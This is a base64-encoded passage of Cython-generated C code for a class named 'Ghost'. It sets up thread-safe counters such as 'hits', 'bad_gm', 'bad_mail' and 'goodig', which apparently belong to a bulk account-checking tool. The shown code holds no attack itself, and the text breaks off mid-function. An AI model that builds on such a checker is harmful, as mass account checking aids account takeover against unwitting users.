UNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgCiAgaWYgKF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfeXksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hemVydHl1aW9wbWxramhnZmRzcXd4Y3ZibikgPCAoMCkpIF9fUFlYX0VSUigwLCA2MCwgX19weXhfTDFfZXJyb3IpCgogIAogIF9fcHl4X3RfMSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNjIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90b3RhbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgNjIsIF9fcHl4X0wxX2Vycm9yKQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oaXRzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA2MiwgX19weXhfTDFfZXJyb3IpCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9nbSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgNjIsIF9fcHl4X0wxX2Vycm9yKQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRfbWFpbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgNjIsIF9fcHl4X0wxX2Vycm9yKQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nb29kaWcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDYyLCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDYyLCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWN0aXZlX3RocmVhZHMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDYyLCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmlsdGVyZWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDYyLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY291bnRlciwgX19weXhfdF8xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDYxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgCiAgX19weXhfdF8yID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZGluZyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0xvY2spOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19weXhfdF81ID0gMTsKICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNCkpKSB7CiAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpOwogICAgYXNzZXJ0KF9fcHl4X3RfMik7CiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzQsIF9fcHl4X19mdW5jdGlvbik7CiAgICBfX3B5eF90XzUgPSAwOwogIH0KICAjZW5kaWYKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMS1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgfQogIGlmIChfX1B5eF9QeU9iamVjdF9TZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xvY2ssIF9fcHl4X3RfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CgogIAogIGlmIChfX1B5eF9QeU9iamVjdF9TZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3J1bm5pbmcsIFB5X1RydWUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNzIsIF9fcHl4X0wxX2Vycm9yKQoKICAKCiAgCiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5fX2luaXRfXyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fcHl4X0wwOjsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydGZfNUdob3N0XzNpbmNyZW1lbnRfY291bnRlcihQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJ0Zl81R2hvc3RfM2luY3JlbWVudF9jb3VudGVyID0geyJpbmNyZW1lbnRfY291bnRlciIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMnRmXzVHaG9zdF8zaW5jcmVtZW50X2NvdW50ZXIsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8zaW5jcmVtZW50X2NvdW50ZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYgPSAwOwogIFB5T2JqZWN0ICpfX3B5eF92X2tleSA9IDA7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJnczsKICAjZW5kaWYKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QqIHZhbHVlc1syXSA9IHswLDB9OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImluY3JlbWVudF9jb3VudGVyICh3cmFwcGVyKSIsIDApOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7CiAgI2Vsc2UKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMOwogICNlbmRpZgogICNlbmRpZgogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIHsKICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbGYsJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9rZXksMH07CiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDsKICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wzX2Vycm9yKQogICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkgewogICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7CiAgICAgICAgY2FzZSAgMjoKICAgICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgIGNhc2UgIDA6IGJyZWFrOwogICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICAgIH0KICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJnczsKICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgImluY3JlbWVudF9jb3VudGVyIiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDNfZXJyb3IpCiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAyOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImluY3JlbWVudF9jb3VudGVyIiwgMSwgMiwgMiwgaSk7IF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAyKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDNfZXJyb3IpCiAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wzX2Vycm9yKQogICAgfQogICAgX19weXhfdl9zZWxmID0gdmFsdWVzWzBdOwogICAgX19weXhfdl9rZXkgPSB2YWx1ZXNbMV07CiAgfQogIGdvdG8gX19weXhfTDZfc2tpcDsKICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7CiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImluY3JlbWVudF9jb3VudGVyIiwgMSwgMiwgMiwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wzX2Vycm9yKQogIF9fcHl4X0w2X3NraXA6OwogIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7CiAgX19weXhfTDNfZXJyb3I6OwogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5pbmNyZW1lbnRfY291bnRlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBOVUxMOwogIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjsKICBfX3B5eF9yID0gX19weXhfcGZfMnRmXzVHaG9zdF8yaW5jcmVtZW50X2NvdW50ZXIoX19weXhfc2VsZiwgX19weXhfdl9zZWxmLCBfX3B5eF92X2tleSk7CgogIAogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF8yaW5jcmVtZW50X2NvdW50ZXIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfa2V5KSB7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfNjsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMTE7CiAgaW50IF9fcHl4X3RfMTI7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiaW5jcmVtZW50X2NvdW50ZXIiLCAwKTsKCiAgCiAgIHsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbG9jayk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDc1LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNzUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX3B5eF90XzQgPSBOVUxMOwogICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDc1LCBfX3B5eF9MM19lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgX19weXhfdF82ID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmIChsaWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHsKICAgICAgX19weXhfdF80ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfNCk7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF82ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBOVUxMfTsKICAgICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA3NSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgfQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICB7CiAgICAgIHsKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfOCwgJl9fcHl4X3RfOSk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOwogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgIHsKCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY291bnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MN19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3Zfa2V5KTsKICAgICAgICAgIF9fcHl4X3RfMyA9IF9fcHl4X3Zfa2V5OwogICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MN19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgMSwgMSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MN19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoKFB5T2JqZWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF90XzMsIF9fcHl4X3RfNCkgPCAwKSkpIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDdfZXJyb3IpCiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CgogICAgICAgICAgCiAgICAgICAgfQogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDEyX3RyeV9lbmQ7CiAgICAgICAgX19weXhfTDdfZXJyb3I6OwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgewogICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5pbmNyZW1lbnRfY291bnRlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xLCAmX19weXhfdF8zLCAmX19weXhfdF80KSA8IDApIF9fUFlYX0VSUigwLCA3NSwgX19weXhfTDlfZXhjZXB0X2Vycm9yKQogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgX19weXhfdF81ID0gUHlUdXBsZV9QYWNrKDMsIF9fcHl4X3RfMSwgX19weXhfdF8zLCBfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA3NSwgX19weXhfTDlfZXhjZXB0X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzIsIF9fcHl4X3RfNSwgTlVMTCk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDc1LCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpCiAgICAgICAgICBfX1